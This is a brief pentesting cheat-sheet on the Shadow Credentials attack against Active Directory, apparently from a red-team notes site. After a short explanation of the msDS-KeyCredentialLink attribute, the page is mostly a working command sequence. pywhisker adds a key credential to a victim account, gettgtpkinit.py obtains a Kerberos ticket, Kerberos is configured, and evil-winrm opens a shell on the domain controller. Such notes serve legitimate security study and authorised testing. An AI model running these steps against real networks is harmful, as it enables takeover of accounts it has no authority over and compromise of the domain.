# Shadow Credentials (msDS-KeyCredentialLink)

{% hint style="info" %}
[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.
{% endhint %}

### Tools

* [pywhisker](https://github.com/ShutdownRepo/pywhisker)
* [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)

#### Exploit Steps

* `python3 pywhisker --dc-ip <IP> -d <domain> -u <user> -p <pass> --target <victim-user> --action add`&#x20;
* `pip3 install -I git+https://github.com/wbond/oscrypto.git`
* `python3 gettgtpkinit.py -cert-pfx ../file.pfx -pfx-pass '<pass>' -dc-ip <IP> <domain>/<victim-username> /tmp/<username>.ccache`&#x20;
* `sudo apt-get install krb5-user -y`
* `sudo nano /etc/krb5.conf`&#x20;
  *   `[libdefaults]`      \
      `default_realm = <domain>`

      `[realms]`      \
      `domain = {`      \
      `kdc = <DC-FQDN>`      \
      `}`&#x20;
* Update `/etc/hosts` file for DC or other server FQDN resolutions
* `export KRB5CCNAME=/tmp/<username>.ccache`&#x20;
* `klist`
* `evil-winrm -i <DC-FQDN> -r <domain>`&#x20;



### References

* [specterops-shadow credentials abusing key trust account mapping for account takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
